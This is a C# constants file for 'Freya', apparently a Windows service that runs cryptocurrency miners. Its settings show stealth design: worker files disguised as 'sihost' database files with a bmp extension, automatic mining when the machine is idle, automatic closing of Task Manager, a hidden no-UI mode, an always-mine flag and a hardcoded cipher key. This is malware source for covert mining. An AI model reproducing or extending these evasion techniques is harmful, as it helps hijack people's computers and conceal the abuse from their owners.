using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Freya
{
    public static class FConstants
    {
        // Debug Mode
        public const bool TextLogEnable = true;

        // Service Info
        public const string ServiceName = "FreyaService";
        public const string ServiceDisplayName = "Freya";
        public const string ServiceDescription = "Freya worker service";

        // Miner Info
        //public const string MinerFilePath = @"C:\Windows\System32"; //自動取出Miner執行檔放到這個路徑
        public static string WorkFilePath = System.AppDomain.CurrentDomain.BaseDirectory;

        public static readonly string[] WorkerFileName = {"sihostc.db", "sihosta.db", "sihostn.db" };
        public static readonly string WorkerExtentionString = "bmp";
        public static readonly int WorkerAPIPort_Start = 18000;     // Worer API port start from. 1000 random port.

        // Miner Strategy
        public const int TimeToCloseTaskmgr = 1200;     // taskmgr開啟超過這個時間就自動關閉
        public const int TimeToAutoStart = 90;         // Idle超過 TimeToAutoStart就自動啟動miner (Service端自動啟動)


        // Log Level
        public enum FreyaLogLevel
        {
            None = -1,      //不輸出任何log
            Normal = 0,     //正常工作資訊
            FreyaInfo = 10, //系統工作Info
            ProxyInfo = 20, //Proxy Debug Mode
            MinerInfo = 30, //Miner Debug Mode
            RAW = 50        //Debug
        }

        //StringCipher Password
        public const string StringCipherKey = "BdD75HJ6+/Jq35zMPsNphu2SKCl!CyBbY";

        // UI ListBox 最大顯示行數
        public const int MaxLogCount = 5000;

        /// <summary>
        /// Feature Byte
        /// <para>以16進位儲存於Registry: <c>Convert.ToString((int)FConstants.FeatureByte.Odin, 16)</c> [ToDo] Encode保護</para>
        /// <para>讀取 <c>FConstants.FeatureByte a = (FConstants.FeatureByte)Convert.ToInt32("10", 16);</c></para>
        ///</summary>
        [Flags]
        public enum FeatureByte
        {
            Base        = 0b_0000_0000_0000_0000,   // Base (Miner)
            Hide        = 0b_0000_0000_0000_0001,   // Hide Mode, No UI
            AlwaysRun   = 0b_0000_0000_0000_0010,   // Always Mining, ignore idel time and taskmanager
            Odin        = 0b_0000_0000_0000_1000,   // Show all information
            ALL = Base | Hide | AlwaysRun | Odin
        }

        public enum WorkerType
        {
            CPU = 0,
            AMD = 1,
            nVidia = 2
        }
    }   

    public class FEnv
    {
        public const string RADIO_OK = "ROK.";
    }

}

